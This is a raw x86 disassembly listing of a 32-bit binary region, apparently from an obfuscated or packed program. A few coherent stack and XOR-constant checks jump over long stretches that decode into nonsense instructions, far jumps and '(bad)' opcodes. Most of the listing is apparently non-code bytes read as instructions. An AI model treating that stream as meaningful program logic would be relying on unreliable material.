  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	bound  ebx,QWORD PTR [edx]
  40bc97:	mov    esi,0x7efbc664
  40bc9c:	jle    0x40bcd6
  40bc9e:	jl     0x40bd1e
  40bca0:	jle    0x40bc23
  40bca2:	jge    0x40bd0e
  40bca4:	inc    edi
  40bca5:	or     ebx,DWORD PTR [ebx-0x27742954]
  40bcab:	cmp    DWORD PTR [edi],esp
  40bcad:	push   cs
  40bcae:	jne    0x40bd29
  40bcb0:	push   ebx
  40bcb1:	shr    BYTE PTR [eax+0x44],cl
  40bcb4:	test   eax,0xd909deb0
  40bcb9:	jecxz  0x40bca1
  40bcbb:	ins    DWORD PTR es:[edi],dx
  40bcbc:	imul   ebp,DWORD PTR [eax+0x7337d3ba],0x3b
  40bcc3:	sbb    DWORD PTR [ebx+ecx*8],ebp
  40bcc6:	nop
  40bcc7:	mov    cl,0x87
  40bcc9:	sbb    al,0x19
  40bccb:	mov    al,BYTE PTR [ecx]
  40bccd:	adc    BYTE PTR [ecx-0x63e14cea],bl
  40bcd3:	pop    ebx
  40bcd4:	je     0x40bce9
  40bcd6:	sub    edx,ebx
  40bcd8:	jmp    0xfe5f:0x3f66dfed
  40bcdf:	mov    ebx,0xef047da9
  40bce4:	cmp    DWORD PTR [esi],esi
  40bce6:	pop    ds
  40bce7:	or     eax,0xa62fedd9
  40bcec:	pusha  
  40bced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcee:	mov    edi,0xbd72ac30
  40bcf3:	enter  0x248e,0x7a
  40bcf7:	adc    DWORD PTR [ebp+0x6b82eca9],edx
  40bcfd:	daa    
  40bcfe:	imul   esp,DWORD PTR [edi+0x68],0x78bb5dc9
  40bd05:	xchg   ebx,eax
  40bd06:	pop    eax
  40bd07:	lods   eax,DWORD PTR ds:[esi]
  40bd08:	test   eax,0xafe03e74
  40bd0d:	inc    edi
  40bd0e:	mov    BYTE PTR cs:0x7461dd3e,0xee
  40bd16:	sahf   
  40bd17:	fwait
  40bd18:	cld    
  40bd19:	sbb    esi,DWORD PTR [edi+0x31]
  40bd1c:	cld    
  40bd1d:	jae    0x40bd9e
  40bd1f:	xor    ecx,edi
  40bd21:	(bad)  
  40bd22:	das    
  40bd23:	js     0x40bd36
  40bd25:	lock inc BYTE PTR [esp+edx*4-0x488c30ca]
  40bd2d:	loop   0x40bcb2
  40bd2f:	push   esi
  40bd30:	neg    DWORD PTR ds:0x1501bf86
  40bd36:	mov    al,ds:0x6de96c4f
  40bd3b:	fnstcw WORD PTR cs:[edx-0x30]
  40bd3f:	jecxz  0x40bd11
  40bd41:	nop
  40bd42:	lock ret 
  40bd44:	or     BYTE PTR [ecx+0x38],ch
  40bd47:	adc    eax,ebp
  40bd49:	xor    bl,BYTE PTR [edi]
  40bd4b:	inc    edx
  40bd4c:	mov    ?,esi
  40bd4e:	and    cl,0x79
  40bd51:	and    edi,ecx
  40bd53:	mov    al,0x78
  40bd55:	dec    ebp
  40bd56:	mov    cs,WORD PTR [ebp-0xe]
  40bd59:	(bad)  
  40bd5a:	retf   
  40bd5b:	mov    al,cs:0x26b0fc28
  40bd61:	sub    al,0xc
  40bd63:	adc    esp,DWORD PTR [ecx+edi*4-0x37]
  40bd67:	sar    DWORD PTR ds:0x8750fab6,0xed
  40bd6e:	jo     0x40bd1d
  40bd70:	in     eax,dx
  40bd71:	jnp    0x40bdb3
  40bd73:	and    eax,0x205324e6
  40bd78:	inc    ebx
  40bd79:	dec    eax
  40bd7a:	pop    ebx
  40bd7b:	jle    0x40bd4e
  40bd7d:	push   ds
  40bd7e:	mov    cl,0xb0
  40bd80:	sbb    eax,0xd99e195c
  40bd85:	es (bad) 
  40bd87:	int3   
  40bd88:	data16 sahf 
  40bd8a:	gs loopne 0x40bd39
  40bd8d:	nop
  40bd8e:	mov    BYTE PTR [ebp-0x5d2fada7],0xe1
  40bd95:	scas   al,BYTE PTR es:[edi]
  40bd96:	mov    eax,0x24f05aab
  40bd9b:	pop    ss
  40bd9c:	fsubp  st(0),st
  40bd9e:	mov    BYTE PTR [ecx+0x74],cl
  40bda1:	jns    0x40be0c
  40bda3:	aam    0xb9
  40bda5:	pusha  
  40bda6:	leave  
  40bda7:	clc    
  40bda8:	repnz ds xchg esi,eax
  40bdab:	mov    dh,0x24
  40bdad:	repz mov ds:0xddb24fa1,eax
  40bdb3:	add    BYTE PTR [edx+0x1f],dl
  40bdb6:	mov    DWORD PTR [ecx],esp
  40bdb8:	jle    0x40be1f
  40bdba:	pop    ss
  40bdbb:	cdq    
  40bdbc:	out    dx,eax
  40bdbd:	lahf   
  40bdbe:	cld    
  40bdbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdc0:	pushf  
  40bdc1:	ret    0x9c6c
  40bdc4:	mov    ds:0x7cee3617,eax
  40bdc9:	dec    ebp
  40bdca:	mov    dh,0xf9
  40bdcc:	push   edx
  40bdcd:	push   ecx
  40bdce:	mov    edi,DWORD PTR [edx+0x3e]
  40bdd1:	mov    al,0xb3
  40bdd3:	sub    eax,0xde07a2cf
  40bdd8:	xor    al,0x3d
  40bdda:	ins    BYTE PTR es:[edi],dx
  40bddb:	retf   
  40bddc:	(bad)  
  40bddd:	pusha  
  40bdde:	mov    edx,DWORD PTR [esi]
  40bde0:	jns    0x40bdef
  40bde2:	(bad)  
  40bde3:	in     eax,dx
  40bde4:	sbb    ebp,eax
  40bde6:	gs adc al,0x61
  40bde9:	leave  
  40bdea:	nop
  40bdeb:	fistp  QWORD PTR [eax+0x76]
  40bdee:	ins    DWORD PTR es:[edi],dx
  40bdef:	mov    al,ds:0x46710136
  40bdf4:	push   edi
  40bdf5:	adc    DWORD PTR [ebx-0x63],ebx
  40bdf8:	outs   dx,DWORD PTR ds:[esi]
  40bdf9:	pop    ebp
  40bdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdfb:	repz pop ds
  40bdfd:	dec    ecx
  40bdfe:	push   esi
  40bdff:	mov    dl,bl
  40be01:	mov    cs:0x6a853469,al
  40be07:	cs call 0x8319:0xb8abfa26
  40be0f:	jo     0x40bd9c
  40be11:	sbb    BYTE PTR [ebp-0x48c6e21a],dl
  40be17:	jge    0x40be96
  40be19:	jg     0x40bdd3
  40be1b:	pop    edx
  40be1c:	cmp    al,BYTE PTR [edi-0x7]
  40be1f:	xor    eax,DWORD PTR [esi-0x61d6aa9e]
  40be25:	push   ebp
  40be26:	sub    DWORD PTR [eax-0x160aca6],edi
  40be2c:	das    
  40be2d:	lea    ebp,[ecx-0x64491009]
  40be33:	add    BYTE PTR [ecx-0x3a],0x3e
  40be37:	xchg   esi,eax
  40be38:	cmp    BYTE PTR [eax-0xe1df24f],0xf0
  40be3f:	enter  0x4ab,0x1d
  40be43:	jns    0x40beae
  40be45:	xor    BYTE PTR [ecx+0x5a],bl
  40be48:	mov    BYTE PTR [edx+eax*4-0x23],dh
  40be4c:	mov    al,0x30
  40be4e:	sbb    BYTE PTR [edx+0x6e],ah
  40be51:	jae    0x40be24
  40be53:	sub    al,0xf3
  40be55:	cmp    BYTE PTR [ecx],dh
  40be57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be58:	in     eax,dx
  40be59:	pop    es
  40be5a:	mov    fs,WORD PTR [ecx+edx*4-0xf4de927]
  40be61:	and    dl,cl
  40be63:	jnp    0x40be71
  40be65:	push   cs
  40be66:	loope  0x40be95
  40be68:	mov    ecx,0x715906e1
  40be6d:	arpl   WORD PTR [esi],bp
  40be6f:	rcr    BYTE PTR [edx+0x48],1
  40be72:	sti    
  40be73:	add    BYTE PTR [eax+esi*2-0xa],0x7d
  40be78:	inc    ecx
  40be79:	mov    al,0xb1
  40be7b:	or     eax,edx
  40be7d:	imul   ecx,DWORD PTR [ebx-0x18],0xb15bd126
  40be84:	adc    BYTE PTR [ecx+0x51d5207],dh
  40be8a:	adc    eax,0x1c4eab80
  40be8f:	adc    BYTE PTR [eax-0x702e43bd],bh
  40be95:	sbb    BYTE PTR [edi+0x45a3d366],0xad
  40be9c:	mov    esp,0x504299cd
  40bea1:	mov    esp,0x37e66e72
  40bea6:	stos   BYTE PTR es:[edi],al
  40bea7:	dec    ecx
  40bea8:	sub    ah,BYTE PTR [edx+eiz*1-0x48fd9061]
  40beaf:	retf   0x1c4f
  40beb2:	mov    esp,0x924f4b65
  40beb7:	loope  0x40be60
  40beb9:	sbb    eax,0xf8eb7639
  40bebe:	sbb    bh,BYTE PTR [edi-0x581a886c]
  40bec4:	test   eax,0xf5e96340
  40bec9:	and    dl,cl
  40becb:	push   esi
  40becc:	jge    0x40bea5
  40bece:	xchg   edi,eax
  40becf:	adc    ebx,DWORD PTR [ebp+0x33434c1e]
  40bed5:	sub    BYTE PTR [eax+0x63],ah
  40bed8:	sbb    BYTE PTR [esi+ebp*4-0x29],dh
  40bedc:	shr    DWORD PTR [eax],cl
  40bede:	cli    
  40bedf:	lea    ecx,[edi+0x50]
  40bee2:	aas    
  40bee3:	mov    al,0xb5
  40bee5:	sti    
  40bee6:	scas   eax,DWORD PTR es:[edi]
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x6ce82331]
  40bf27:	adc    BYTE PTR [eax+0x387e7ef9],al
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf6c
  40bf31:	loopne 0x40bf6f
  40bf33:	push   esp
  40bf34:	ja     0x40bf64
  40bf36:	popa   
  40bf37:	and    DWORD PTR [ecx-0x37],ebp
  40bf3a:	xchg   esp,eax
  40bf3b:	(bad)  
  40bf3c:	leave  
  40bf3d:	setg   ah
  40bf40:	shr    DWORD PTR [esi+0x35],1
  40bf43:	das    
  40bf44:	aam    0x42
  40bf46:	push   ebx
  40bf47:	mov    eax,ds:0xec45087e
  40bf4c:	retf   
  40bf4d:	and    BYTE PTR [ebx+esi*2-0x3a],0x3b
  40bf52:	es push ecx
  40bf54:	(bad)  
  40bf55:	mov    WORD PTR [esi-0x14],gs
  40bf58:	jle    0x40bf6f
  40bf5a:	push   eax
  40bf5b:	aaa    
  40bf5c:	leave  
  40bf5d:	xchg   esi,edi
  40bf5f:	cdq    
  40bf60:	rcr    BYTE PTR [ebp-0x1a],0x71
  40bf64:	shl    ebx,0xd9
  40bf67:	mov    cl,0xe2
  40bf69:	xchg   ch,dl
  40bf6b:	sub    eax,ebx
  40bf6d:	shl    DWORD PTR [esi+0x607caaee],cl
  40bf73:	scas   eax,DWORD PTR es:[edi]
  40bf74:	mov    edx,DWORD PTR [ebx]
  40bf76:	push   cs
  40bf77:	and    eax,0x99965a99
  40bf7c:	fidiv  DWORD PTR [edx]
  40bf7e:	mov    edi,0xff8f044b
  40bf83:	push   ecx
  40bf84:	(bad)  
  40bf85:	mov    ebp,0xcf6d7c25
  40bf8a:	cmp    eax,0x467930c5
  40bf8f:	sbb    dh,BYTE PTR [edi-0x5e344263]
  40bf95:	in     eax,dx
  40bf96:	cli    
  40bf97:	jmp    0x7a140e7a
  40bf9c:	stos   BYTE PTR es:[edi],al
  40bf9d:	daa    
  40bf9e:	push   esi
  40bf9f:	add    eax,0xf1028c7e
  40bfa4:	xchg   edi,eax
  40bfa5:	std    
  40bfa6:	jle    0x40bf78
  40bfa8:	mov    ds:0x6e6d5aea,al
  40bfad:	pop    ecx
  40bfae:	sbb    ch,BYTE PTR [ecx-0x52adf6e3]
  40bfb4:	sub    al,BYTE PTR [esi-0x31797c2f]
  40bfba:	pop    ebx
  40bfbb:	leave  
  40bfbc:	pop    ecx
  40bfbd:	xchg   ecx,eax
  40bfbe:	sub    esi,edi
  40bfc0:	call   0x8a6e2b3b
  40bfc5:	jg     0x40bf4d
  40bfc7:	clc    
  40bfc8:	bound  ebp,QWORD PTR [ebx]
  40bfca:	rcl    BYTE PTR [edx+0x41],0xf9
  40bfce:	pop    ebp
  40bfcf:	cmp    ebp,eax
  40bfd1:	imul   DWORD PTR [ecx]
  40bfd3:	in     eax,0xb9
  40bfd5:	add    eax,0x1fcf8cc6
  40bfda:	sbb    BYTE PTR [edx-0x20e872b3],ch
  40bfe0:	jbe    0x40bf67
  40bfe2:	bound  eax,QWORD PTR [ecx-0x21e53712]
  40bfe8:	fsub   DWORD PTR [ebp+0xe]
  40bfeb:	call   0x3e1b6370
  40bff0:	jbe    0x40c024
  40bff2:	rcl    BYTE PTR [ebx],0x88
  40bff5:	outs   dx,BYTE PTR ds:[esi]
  40bff6:	xchg   ebx,eax
  40bff7:	inc    eax
  40bff8:	aaa    
  40bff9:	bound  eax,QWORD PTR [ecx-0x18e85aca]
  40bfff:	push   es
  40c000:	pop    esi
  40c001:	push   ecx
  40c002:	push   ds
  40c003:	stos   BYTE PTR es:[edi],al
  40c004:	std    
  40c005:	cmc    
  40c006:	mov    ch,0x28
  40c008:	mov    ah,0xb2
  40c00a:	lods   al,BYTE PTR ds:[esi]
  40c00b:	fadd   st(7),st
  40c00d:	pop    edi
  40c00e:	xor    eax,0xb541b53c
  40c013:	stos   DWORD PTR es:[edi],eax
  40c014:	mov    cl,0x4f
  40c016:	cs push 0xe99ece4e
  40c01c:	inc    ecx
  40c01d:	xchg   esp,eax
  40c01e:	xor    DWORD PTR [edx],ebx
  40c020:	jno    0x40bfb5
  40c022:	dec    eax
  40c023:	es popa 
  40c025:	xor    al,0xe5
  40c027:	or     BYTE PTR [ebx],dh
  40c029:	les    ebx,FWORD PTR [ebp+ecx*4-0x5e400720]
  40c030:	mov    ds:0x9670c738,al
  40c035:	rol    ch,cl
  40c037:	dec    esi
  40c038:	mov    ebp,0xfa22990b
  40c03d:	mov    ebx,DWORD PTR [ecx+0x65fa35d8]
  40c043:	mov    ds:0x55ebad3c,al
  40c048:	push   es
  40c049:	sbb    eax,0xf9444cc7
  40c04e:	mov    esp,0x8869e52c
  40c053:	inc    edx
  40c055:	mov    ch,0xd0
  40c057:	std    
  40c058:	shl    ah,cl
  40c05a:	push   ecx
  40c05b:	pop    esi
  40c05c:	jno    0x40c003
  40c05e:	cld    
  40c05f:	fwait
  40c060:	or     esi,DWORD PTR [eax]
  40c062:	fisub  DWORD PTR [edx-0x23c2b72b]
  40c068:	ds dec ebx
  40c06a:	and    al,0x26
  40c06c:	pop    esp
  40c06d:	test   eax,0x64639bac
  40c072:	jg     0x40c0bb
  40c074:	sub    al,0x51
  40c076:	dec    ebx
  40c077:	shl    DWORD PTR [ecx+0x26caaa95],0x8
  40c07e:	das    
  40c07f:	mov    ecx,0x5f21569a
  40c084:	xchg   edx,eax
  40c085:	mov    al,al
  40c087:	cmp    eax,ebp
  40c089:	mov    edx,0x9d2f121
  40c08e:	std    
  40c08f:	test   al,0x88
  40c091:	and    al,BYTE PTR [esi+eax*1-0x4c3dfae2]
  40c098:	fs add bh,dh
  40c09b:	(bad)  
  40c09c:	fistp  WORD PTR [ebx]
  40c09e:	sub    edi,DWORD PTR [edx-0x37]
  40c0a1:	mov    dl,0x1e
  40c0a3:	les    esi,FWORD PTR [ebx]
  40c0a5:	or     bl,ah
  40c0a7:	adc    dh,bl
  40c0a9:	push   ecx
  40c0aa:	sbb    ah,BYTE PTR [edx+0x7bfa9d71]
  40c0b0:	dec    ebp
  40c0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0b2:	sbb    al,0xb3
  40c0b4:	das    
  40c0b5:	mov    dl,0x77
  40c0b7:	jmp    FWORD PTR ds:0x830404bc
  40c0bd:	ins    BYTE PTR es:[edi],dx
  40c0be:	das    
  40c0bf:	shrd   DWORD PTR [ebx-0x47],ecx,0x79
  40c0c4:	test   BYTE PTR [ebx],ah
  40c0c6:	mov    cl,0x68
  40c0c8:	std    
  40c0c9:	fld    TBYTE PTR [edi-0x60d2c53d]
  40c0cf:	call   0xe329:0xc7a93fda
  40c0d6:	ret    
  40c0d7:	into   
  40c0d8:	les    esp,FWORD PTR [edi]
  40c0da:	lea    esi,[edx-0xe]
  40c0dd:	mov    BYTE PTR [ebx-0x3a],bl
  40c0e0:	or     eax,0xc8f758b8
  40c0e5:	and    eax,0x323ddf1e
  40c0ea:	or     ch,cl
  40c0ec:	pop    es
  40c0ed:	and    eax,0xb6a53f8e
  40c0f2:	sbb    bl,ch
  40c0f4:	push   es
  40c0f5:	adc    eax,0xcd3eed1c
  40c0fa:	mov    WORD PTR [eax+ecx*1-0x7eb48172],?
  40c101:	je     0x40c0b0
  40c103:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40c105:	mov    DWORD PTR [edi-0x36],ebx
  40c108:	in     eax,0x5f
  40c10a:	mov    al,ds:0x4c5f3b87
  40c10f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c110:	les    esi,FWORD PTR [esi]
  40c112:	pop    esi
  40c113:	push   ss
  40c114:	mov    ecx,0xb0ba86de
  40c119:	xchg   esi,eax
  40c11a:	add    BYTE PTR cs:[ebp-0x25],bl
  40c11e:	push   esi
  40c11f:	lods   al,BYTE PTR ds:[esi]
  40c120:	cld    
  40c121:	rcr    DWORD PTR [ebp-0x48],0x6d
  40c125:	pop    edx
  40c126:	aas    
  40c127:	mov    edi,ebx
  40c129:	fidivr WORD PTR [ecx]
  40c12b:	(bad)  
  40c12c:	xchg   DWORD PTR [ecx+0x71],ecx
  40c12f:	xchg   ebp,eax
  40c130:	in     al,dx
  40c131:	mov    eax,0xcb4f9895
  40c136:	or     edi,ebx
  40c138:	test   cl,ah
  40c13a:	repnz in eax,dx
  40c13c:	xor    BYTE PTR [ebp-0x5a],dl
  40c13f:	ret    0x52bf
  40c142:	ret    0x4234
  40c145:	pop    esp
  40c146:	mov    eax,DWORD PTR [edi]
  40c148:	aam    0x2
  40c14a:	ja     0x40c18e
  40c14c:	call   0xc0e2c0b8
  40c151:	scas   eax,DWORD PTR es:[edi]
  40c152:	or     dl,BYTE PTR [ecx-0x15]
  40c155:	ret    0x89a1
  40c158:	adc    BYTE PTR [esi-0x28910acf],dh
  40c15e:	xor    ebp,DWORD PTR [edi]
  40c160:	push   0x9f1f0124
  40c165:	mov    edi,0x91026eb5
  40c16a:	xchg   edi,eax
  40c16b:	retf   
  40c16c:	ret    
  40c16d:	test   BYTE PTR [esi-0x45],bl
  40c170:	pop    eax
  40c171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c172:	in     al,0x4d
  40c174:	sub    esi,DWORD PTR [edx-0x74b63479]
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x61
  40c196:	push   es
  40c197:	outs   dx,DWORD PTR ds:[esi]
  40c198:	dec    BYTE PTR [edx-0x79]
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	sbb    edi,eax
  40c1a3:	pop    ds
  40c1a4:	leave  
  40c1a5:	jo     0x40c1d8
  40c1a7:	and    cl,BYTE PTR [esi+0x3b49343b]
  40c1ad:	adc    ebx,DWORD PTR [esi]
  40c1af:	sti    
  40c1b0:	aaa    
  40c1b1:	sahf   
  40c1b2:	fbld   TBYTE PTR [edi-0xa]
  40c1b5:	aam    0x10
  40c1b7:	inc    esi
  40c1b8:	sub    cl,ch
  40c1ba:	adc    bh,BYTE PTR ds:0x1f74056e
  40c1c0:	sub    ah,BYTE PTR [edi-0x3a]
  40c1c3:	lds    eax,FWORD PTR [edi]
  40c1c5:	sub    eax,0xa15321e1
  40c1ca:	popa   
  40c1cb:	ins    BYTE PTR es:[edi],dx
  40c1cc:	imul   edi,DWORD PTR [ecx],0xffffffc8
  40c1cf:	ss push ebp
  40c1d1:	popa   
  40c1d2:	cmp    DWORD PTR [edx+edx*8+0x41dd8d8a],esi
  40c1d9:	mov    edx,0x5aae2786
  40c1de:	xor    al,0x7a
  40c1e0:	jmp    0x21cc2762
  40c1e5:	test   BYTE PTR [eax-0x2f],bh
  40c1e8:	and    eax,0xd691c13b
  40c1ed:	cld    
  40c1ee:	ds and edi,eax
  40c1f1:	adc    BYTE PTR [edi],bl
  40c1f3:	cmp    eax,0x88c585cf
  40c1f8:	scas   al,BYTE PTR es:[edi]
  40c1f9:	iret   
  40c1fa:	dec    edi
  40c1fb:	in     eax,0xe4
  40c1fd:	push   ds
  40c1fe:	pop    eax
  40c1ff:	sub    ebp,DWORD PTR [esi-0x63ef73da]
  40c205:	lahf   
  40c206:	dec    ebp
  40c207:	cmp    esi,DWORD PTR [esi]
  40c209:	cwde   
  40c20a:	dec    eax
  40c20b:	bound  edx,QWORD PTR ds:0x2b60b7f0
  40c211:	push   ebx
  40c212:	in     eax,0x6f
  40c214:	pop    eax
  40c215:	or     DWORD PTR [esi+0x56],esi
  40c218:	jl     0x40c1c0
  40c21a:	xor    DWORD PTR [ebp+0x21380f19],eax
  40c220:	jge    0x40c1cf
  40c222:	mov    DWORD PTR [eax],eax
  40c224:	pop    esp
  40c225:	jecxz  0x40c27b
  40c227:	(bad)  
  40c229:	sbb    cl,0xe9
  40c22c:	sub    bh,bh
  40c22e:	bound  edi,QWORD PTR [si]
  40c231:	loope  0x40c1d8
  40c233:	outs   dx,BYTE PTR ds:[esi]
  40c234:	xchg   esp,eax
  40c235:	sbb    BYTE PTR [ebp+0x25],0x60
  40c239:	pusha  
  40c23a:	push   ebp
  40c23b:	pop    es
  40c23c:	push   ds
  40c23d:	jne    0x40c29b
  40c23f:	adc    DWORD PTR [edx+0x1445b7aa],esi
  40c245:	adc    edx,DWORD PTR [eax-0x7c]
  40c248:	jp     0x40c1cb
  40c24a:	test   al,0x6d
  40c24c:	fild   QWORD PTR [eax]
  40c24e:	fwait
  40c24f:	pop    esp
  40c250:	mov    esp,esp
  40c252:	fild   WORD PTR [edi+edx*8-0x22]
  40c256:	mov    gs,WORD PTR [ecx-0x1e]
  40c259:	dec    edi
  40c25a:	dec    edx
  40c25b:	lods   al,BYTE PTR ds:[esi]
  40c25c:	pop    esp
  40c25d:	cmp    esp,DWORD PTR [edx]
  40c25f:	arpl   bp,dx
  40c261:	loope  0x40c26f
  40c263:	and    al,0x1a
  40c265:	lods   eax,DWORD PTR ds:[esi]
  40c266:	mov    ah,0x2c
  40c268:	jmp    0x2ba93f78
  40c26d:	addr16 push 0xffffffff
  40c270:	jecxz  0x40c2cb
  40c272:	add    DWORD PTR [edx+0x1a],ebp
  40c275:	addr16 and al,0x54
  40c278:	es cdq 
  40c27a:	jmp    0x40c22d
  40c27c:	jns    0x40c2cf
  40c27e:	lock cmp DWORD PTR [edi+edi*8+0x62881c88],ecx
  40c286:	push   0x78
  40c288:	push   0xed0a527
  40c28d:	push   cs
  40c28e:	fld    st(3)
  40c290:	adc    DWORD PTR [ecx-0x19],esp
  40c293:	jle    0x40c2f7
  40c295:	mov    cl,0x59
  40c297:	xchg   ch,al
  40c299:	ja     0x40c22d
  40c29b:	das    
  40c29c:	or     ch,BYTE PTR [ebx-0x63c10cfd]
  40c2a2:	dec    esi
  40c2a3:	fs clc 
  40c2a5:	push   edi
  40c2a6:	cmp    eax,0xb7a5f33d
  40c2ab:	sbb    BYTE PTR [ebx],bh
  40c2ad:	or     al,0x18
  40c2af:	in     al,dx
  40c2b0:	cmp    al,0x3b
  40c2b2:	add    BYTE PTR [eax-0x50316867],ah
  40c2b8:	fsubrp st(7),st
  40c2ba:	gs sbb al,0xdf
  40c2bd:	dec    edx
  40c2be:	xchg   BYTE PTR [ecx+0x1ad52064],ch
  40c2c4:	inc    edx
  40c2c5:	dec    ebp
  40c2c6:	pop    ebx
  40c2c7:	loop   0x40c2a8
  40c2c9:	fs and eax,0x6982fdeb
  40c2cf:	pop    esp
  40c2d0:	scas   al,BYTE PTR es:[edi]
  40c2d1:	xor    DWORD PTR [ebp-0x341955dd],esp
  40c2d7:	inc    edx
  40c2d8:	and    dh,BYTE PTR [ebx-0x6047ec14]
  40c2de:	and    eax,0x13d41d7
  40c2e3:	or     eax,0x8cdc538e
  40c2e8:	cs mov ch,0xa2
  40c2eb:	call   0x19fb:0x1688aef3
  40c2f2:	pop    esp
  40c2f3:	test   bl,0xb5
  40c2f6:	call   0x40b0eddd
  40c2fb:	jle    0x40c2c5
  40c2fd:	jl     0x40c342
  40c2ff:	mov    bh,0x8a
  40c301:	pcmpeqd mm4,QWORD PTR [edx-0x13f86c6e]
  40c308:	xchg   ebp,ebp
  40c30a:	test   ecx,ebp
  40c30c:	jns    0x40c37e
  40c30e:	mov    bl,0x3c
  40c310:	leave  
  40c311:	or     dh,bl
  40c313:	or     esi,DWORD PTR [eax]
  40c315:	popf   
  40c316:	mov    dl,0x4d
  40c318:	inc    esi
  40c319:	dec    ebx
  40c31a:	add    eax,edi
  40c31c:	scas   al,BYTE PTR es:[edi]
  40c31d:	fisttp DWORD PTR [edx+0x61]
  40c320:	or     al,0xc2
  40c322:	inc    ebx
  40c323:	(bad)  
  40c324:	jne    0x40c341
  40c326:	inc    esi
  40c327:	or     bh,BYTE PTR gs:[esp+eiz*2-0x61e0b459]
  40c32f:	jbe    0x40c2e4
  40c331:	mov    dl,0x9a
  40c333:	imul   ebx,ebx,0x36882889
  40c339:	scas   al,BYTE PTR es:[edi]
  40c33a:	dec    eax
  40c33b:	call   0x4f28:0xb56f8088
  40c342:	out    0x5e,al
  40c344:	xor    edx,DWORD PTR [esi-0x6064a618]
  40c34a:	lods   eax,DWORD PTR ds:[esi]
  40c34b:	shl    bl,cl
  40c34d:	jae    0x40c37e
  40c34f:	adc    al,0x99
  40c351:	inc    edi
  40c352:	iret   
  40c353:	mov    BYTE PTR [esi+0x7f62c23],cl
  40c359:	(bad)  
  40c35a:	push   edx
  40c35b:	(bad)  
  40c35c:	jb     0x40c328
  40c35e:	in     eax,0x7d
  40c360:	cmp    al,0x62
  40c362:	rol    BYTE PTR [esi-0x2625d8d3],1
  40c368:	and    BYTE PTR [ecx-0x7a],cl
  40c36b:	jmp    0x10f66083
  40c370:	sub    al,al
  40c372:	mov    dh,0x89
  40c374:	pop    ecx
  40c375:	pop    ecx
  40c376:	sbb    BYTE PTR [edx-0x32b1932c],ch
  40c37c:	loop   0x40c386
  40c37e:	pop    ss
  40c37f:	cmp    al,0x9e
  40c381:	fnstenv [eax-0x457424ea]
  40c387:	adc    DWORD PTR [ecx],esp
  40c389:	xor    al,0xc
  40c38b:	xchg   esi,eax
  40c38c:	loop   0x40c3a5
  40c38e:	inc    esp
  40c38f:	mov    al,ds:0xd7070d92
  40c394:	aam    0x2b
  40c396:	mov    edi,0x26cee912
  40c39b:	aas    
  40c39c:	or     al,0x94
  40c39e:	inc    esi
  40c39f:	jnp    0x40c3b2
  40c3a1:	cmp    DWORD PTR [ecx],esp
  40c3a3:	jnp    0x40c3ae
  40c3a5:	sub    esi,eax
  40c3a7:	adc    al,BYTE PTR [edi]
  40c3a9:	add    ecx,edx
  40c3ab:	(bad)  
  40c3ac:	fs adc al,0x97
  40c3af:	rcl    DWORD PTR [edx-0x548b4fe5],1
  40c3b5:	neg    al
  40c3b7:	inc    ebp
  40c3b8:	sbb    eax,0x6df31a48
  40c3bd:	jb     0x40c395
  40c3bf:	out    dx,al
  40c3c0:	push   ebx
  40c3c1:	cmp    eax,0x9343ab22
  40c3c6:	fmul   DWORD PTR [ebx+ebp*8+0x2e]
  40c3ca:	add    ebp,0xffffffa6
  40c3cd:	retf   
  40c3ce:	push   esp
  40c3cf:	outs   dx,DWORD PTR ds:[esi]
  40c3d0:	cmc    
  40c3d1:	iret   
  40c3d2:	sahf   
  40c3d3:	outs   dx,DWORD PTR ds:[esi]
  40c3d4:	xchg   BYTE PTR [eax+0x7234dd60],ch
  40c3da:	cwde   
  40c3db:	lds    ebp,FWORD PTR [eax]
  40c3dd:	mov    esp,edi
  40c3df:	jae    0x40c398
  40c3e1:	adc    edi,DWORD PTR [edx-0x9f1f3cc]
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
